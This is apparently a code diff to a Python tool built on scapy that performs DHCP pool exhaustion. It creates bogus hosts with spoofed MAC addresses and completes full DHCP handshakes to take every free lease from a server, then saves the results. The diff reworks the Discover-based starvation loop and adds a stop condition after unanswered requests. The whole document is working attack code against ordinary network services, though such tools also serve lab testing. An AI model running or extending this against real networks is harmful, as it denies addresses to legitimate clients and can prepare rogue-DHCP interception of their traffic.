@@ -18,7 +18,8 @@ from utils import setup_logging, write_to_log, file_semaphore
 
 
 #### CONFIG #### -------------------------------------------------------------------
-timeout_to_receive_response = 5 # Time to wait until non response is decided
+timeout_to_receive_dhcp_response = 10 # Time to wait until non response is decided
+unanswered_discovers_to_conclude_exhaustion = 3
 catch_and_release = False # Debug mode. Pool exhaustion + save results + Load results + Release + Save results
 base_dir = Path(__file__).resolve().parent
 log_file = base_dir / "logs" / "pool_exhaustion.log"
@@ -152,13 +153,14 @@ def remove_expired_spoofed_hosts(host_dict):
     
     return host_dict
 
-
+'''
 def pool_exhaustion_with_request(ip_list):
     """
     Perform a Request-ACK transaction for every IP address on ip_list list
     """
     # Counter to track how many IP addresses are obtained to determine if a more general DHCP Discover spoof is needed
     spoofed_ips_counter = 0
+    unanswered_counter = 0 
 
     for ip in ip_list:
         
@@ -173,7 +175,7 @@ def pool_exhaustion_with_request(ip_list):
         write_to_log(f"DHCP Request sent: {host.mac_address} requesting {host.ip_address}")
 
         # Waits until timeout or DHCP Response is received
-        dhcp_request_response = process_dhcp_packet(dhcp_request_packet[scapy.BOOTP].xid, timeout_to_receive_response)
+        dhcp_request_response = process_dhcp_packet(dhcp_request_packet[scapy.BOOTP].xid, timeout_to_receive_dhcp_response)
 
         # If there's response
         if dhcp_request_response:
@@ -197,7 +199,12 @@ def pool_exhaustion_with_request(ip_list):
                 
             else:
                 write_to_log(f"Unknown DHCP response received: DHCP.MessageType = {dhcp_request_packet[scapy.DHCP].options[0][1]}")
-    
+        else:
+            unanswered_counter += 1
+            write_to_log("Timeout reached without receiving a valid DHCP Request response.")
+            
+        if unanswered_counter == 10:
+            return 0
     return spoofed_ips_counter
 
 
@@ -207,6 +214,7 @@ def pool_exhaustion_with_discover(number):
     """
 
     spoofed_ips_counter = 0
+    unanswered_counter = 0
 
     for _ in range(number):
         # Create a new bogus host
@@ -219,7 +227,7 @@ def pool_exhaustion_with_discover(number):
         write_to_log(f"DHCP Discover sent: {host.mac_address} requesting a new IP address")
 
         # Waits until timeout or DHCP Response is received
-        dhcp_discover_response = process_dhcp_packet(dhcp_discover_packet[scapy.BOOTP].xid, timeout_to_receive_response)
+        dhcp_discover_response = process_dhcp_packet(dhcp_discover_packet[scapy.BOOTP].xid, timeout_to_receive_dhcp_response)
 
         if dhcp_discover_response:
 
@@ -239,7 +247,7 @@ def pool_exhaustion_with_discover(number):
                 write_to_log(f"DHCP Request sent: {host.mac_address} requesting {host.ip_address}")
 
                 # Waits until timeout or DHCP Response is received
-                dhcp_request_response = process_dhcp_packet(dhcp_request_packet[scapy.BOOTP].xid, timeout_to_receive_response)
+                dhcp_request_response = process_dhcp_packet(dhcp_request_packet[scapy.BOOTP].xid, timeout_to_receive_dhcp_response)
 
                 # If there's response
                 if dhcp_request_response:
@@ -282,7 +290,125 @@ def pool_exhaustion_with_discover(number):
             write_to_log("Timeout reached without receiving a valid DHCP Discover response.")
             pass
 
+        if unanswered_counter == 10:
+            return 0
+
     return spoofed_ips_counter
+'''
+
+
+def pool_exhaustion_with_discover(number):
+    """
+    Perform a complete DORA handshake "number" times
+    """
+
+    spoofed_ips_counter = 0
+    unanswered_counter = 0
+
+    for _ in range(number):
+        # Create a new bogus host
+        host = fake_host.create_host()
+
+        acquisition_successfull = perform_dhcp_discover_offer(host)
+
+        if acquisition_successfull:
+            spoofed_ips_counter += 1
+        else:
+            unanswered_counter += 1
+
+        if unanswered_counter >= unanswered_discovers_to_conclude_exhaustion:
+            break
+
+    return spoofed_ips_counter
+
+
+def perform_dhcp_discover_offer(host):
+    """
+    Perform a DHCP Discover-Offer transaction. 
+    If a DHCP Offer is received, continues with Request-ACK
+    """
+
+    # Create new DHCP Discover packet
+    dhcp_discover_packet = create_dhcp_discover_packet(host)
+
+    # Send DHCP Discover
+    scapy.sendp(dhcp_discover_packet, verbose=False, iface=iface)
+    write_to_log(f"DHCP Discover sent: {host.mac_address} requesting a new IP address")
+
+    # Waits until timeout or DHCP Response is received
+    dhcp_discover_response = process_dhcp_packet(dhcp_discover_packet[scapy.BOOTP].xid, timeout_to_receive_dhcp_response)
+
+    if dhcp_discover_response:
+
+        # Update hosts parameters, like a new assigned IP address
+        print(f"{dhcp_discover_response.summary()}")
+        response_type = handle_dhcp_response(dhcp_discover_response, host)
+
+        if response_type == "OFFER":
+
+            #print(f"Offer received")
+            write_to_log(f"DHCP Offer received: {host.mac_address} offered {host.ip_address}")
+            # Return True if ip acquisition is successful
+            return perform_dhcp_request_ack(host)
+
+        elif response_type == "ACK":
+
+            # ACK in this stage is not expected, but just in case 
+            write_to_log(f"ACK received: {host.mac_address} successfully linked to {host.ip_address}")
+
+        elif response_type == "NAK":
+
+            #print(f"NAK received")
+            write_to_log(f"DHCP NAK received: Failed to obtain an IP address for that host")
+
+        else:
+
+            write_to_log(f"Unknown DHCP response received: DHCP.MessageType = {dhcp_discover_packet[scapy.DHCP].options[0][1]}")
+            return
+
+    else:
+
+        # If no response is received
+        write_to_log("Timeout reached without receiving a valid DHCP Discover response.")
+        return
+    
+
+def perform_dhcp_request_ack(host):
+    """
+    Completes the DHCP handshake process after receiving a DHCP Offer
+    """
+
+    # If Discover-Offer occurs, continue with DORA handshake
+    dhcp_request_packet = create_broadcast_dhcp_request_packet(host)
+    # Send DHCP Request
+    scapy.sendp(dhcp_request_packet, verbose=False, iface=iface)
+    write_to_log(f"DHCP Request sent: {host.mac_address} requesting {host.ip_address}")
+
+    # Waits until timeout or DHCP Response is received
+    dhcp_request_response = process_dhcp_packet(dhcp_request_packet[scapy.BOOTP].xid, timeout_to_receive_dhcp_response)
+
+    # If there's response
+    if dhcp_request_response:
+        
+        print(f"{dhcp_request_response.summary()}")
+        # Check what kind of DHCP response is
+        response_type = handle_dhcp_response(dhcp_request_response, host)
+
+        if response_type == "ACK":
+            # DORA handshake completed, saving new host to json file
+            write_to_log(f"ACK received: {host.mac_address} successfully linked to {host.ip_address}")
+            host_dict = {}
+            host_dict[host.ip_address] = host
+            update_json_file(host_dict, json_file)
+            # IP acquisition successfull
+            return True
+        elif response_type == "NAK":
+
+            write_to_log(f"DHCP NAK received: {host.mac_address} failed to acquire {host.ip_address}")
+                 
+        else:
+            write_to_log(f"Unknown DHCP response received: DHCP.MessageType = {dhcp_request_packet[scapy.DHCP].options[0][1]}")
+            return
 
 
 def release_all_ips(host_dict):
@@ -335,7 +461,7 @@ def main():
 
     # Pool exhaustion: getting all avalaible IP from DHCP server's pool
     try:
-        
+        '''
         write_to_log(f"Starting DHCP Request pool exhaustion")
         spoofed_ips_counter = pool_exhaustion_with_request(ip_list_to_spoof)
         write_to_log(f"DHCP Request exhaustion completed with a total of {spoofed_ips_counter} IP addresses acquired")
@@ -348,7 +474,7 @@ def main():
         write_to_log(f"Starting DHCP Discover pool exhaustion")
         spoofed_ips_counter = pool_exhaustion_with_discover(len(ip_list_to_spoof))
         write_to_log(f"DHCP Discover exhaustion completed with a total of {spoofed_ips_counter} IP addresses acquired")
-        '''
+        
         
         write_to_log(f"Pool exhaustion completed")
 
